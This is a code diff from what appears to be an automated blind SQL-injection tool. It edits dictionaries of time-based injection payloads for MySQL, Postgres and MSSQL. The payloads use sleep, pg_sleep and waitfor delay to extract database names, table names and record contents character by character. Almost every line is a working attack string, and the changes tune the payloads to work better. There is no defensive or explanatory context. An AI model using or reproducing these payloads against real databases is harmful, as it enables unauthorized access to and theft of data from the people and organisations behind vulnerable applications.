@@ -54,7 +54,7 @@ PayloadsAttempt={ # Theses payloads are used in the SQLi blind detection
 
 PayloadsDBnames = {
 	#'MySQL': 'and ascii(substring((select schema_name from information_schema.schemata limit 1 offset {0}),{1},1)) < {2}',
-	'MySQL':"and if((ascii(substring((select group_concat(schema_name) from information_schema.schemata),{0},1)) < {1}),sleep(DOORMIR),null)=0",
+	'MySQL':" and if((ascii(substring((select group_concat(schema_name) from information_schema.schemata),{0},1)) < {1}),sleep(DOORMIR),null)=0",
 
 	'Postgres': "and ascii(substring((select array_to_string(array_agg(datname),',') from pg_database),{0},1)) < {1} and 1 = (select 1 from pg_sleep(DOORMIR))",
 	'Mssql': "and ascii((select substring((select Substring((select ','+name from Sys.Databases FOR XML PATH('')),2,10000) from Sys.Databases order by name OFFSET 1 ROWS fetch next 1 rows only),{0},1))) < {1} if 1=1 waitfor delay '00:00:DOORMIR'",
@@ -88,7 +88,7 @@ TableLength = {
 #select array_to_string(array_agg(c.relname),',') FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN ('r','') AND n.nspname NOT IN ('pg_catalog', 'pg_toast') AND pg_catalog.pg_table_is_visible(c.oid)
 
 TablesName={
-	'MySQL':'and if((ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema="{0}"),{1},1)) < {2}),sleep(DOORMIR),null)=0',
+	'MySQL':' and if((ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema="{0}"),{1},1)) < {2}),sleep(DOORMIR),null)=0',
 	#'Postgres':"and ascii(substring((select array_to_string(array_agg(table_name),',') FROM information_schema.tables where table_schema='public' ),{1},1)) < {2}",
 	'Postgres':"and 1=1;((select case when(ascii(substring((select array_to_string(array_agg(c.relname),',') FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN ('r','') AND n.nspname NOT IN ('pg_catalog', 'pg_toast') AND pg_catalog.pg_table_is_visible(c.oid)),{1},1)) < {2}) then pg_sleep(DOORMIR) else 'E' END));",
 	'Mssql':"and ascii(substring((substring((select ','+name from {0}..sysobjects where xtype = 'U' for xml path('')),2,10000)),{1},1)) < {2} if 1=1 waitfor delay '00:00:DOORMIR'",
@@ -134,14 +134,14 @@ numRegisters = {
 RecordQuerys = {
 #"and ascii(substring((select columna from Base.Tabla limit 1 offset {3}),{4},1)) < {5}"
 	'MySQL': 'and if((ascii(substring((select {0} from {1}.{2} limit 1 offset {3}),{4},1)) < {5}),sleep(DOORMIR),null)=0',
-	'Postgres': "and 1=1;((select case when(ascii(substring((select {0} from {1}{2} limit 1 offset {3}),{4},1)) < {5}) then pg_sleep(DOORMIR) else 'E' END));",
+	'Postgres': "and 1=1;((select case when(ascii(substring((select {0}::text from {1}{2} limit 1 offset {3}),{4},1)) < {5}) then pg_sleep(DOORMIR) else 'E' END));",
 	'Mssql': "and ascii(substring((select {0} from {1}..{2} order by {0} OFFSET {3} ROWS fetch next 1 rows only),{4},1)) < {5} if 1=1 waitfor delay '00:00:DOORMIR'",
 	'Oracle': ''
 	}
 
 TamrecordQuery = {
 	'MySQL': 'and if(((select length((select {0} from {1}.{2} limit 1 offset {3})) < {4})),sleep(DOORMIR),null)=0',
-	'Postgres':"and 1=1;((select case when((select length((select {0} from {1}{2} limit 1 offset {3})) < {4})) then pg_sleep(DOORMIR) else 'E' END));",
+	'Postgres':"and 1=1;((select case when((select length((select {0}::text from {1}{2} limit 1 offset {3})) < {4})) then pg_sleep(DOORMIR) else 'E' END));",
 	'Mssql':"and len((select {0} from {1}..{2} order by {0} OFFSET {3} ROWS fetch next 1 rows only)) < {4} if 1=1 waitfor delay '00:00:DOORMIR'",
 	'Oracle':""
 	}
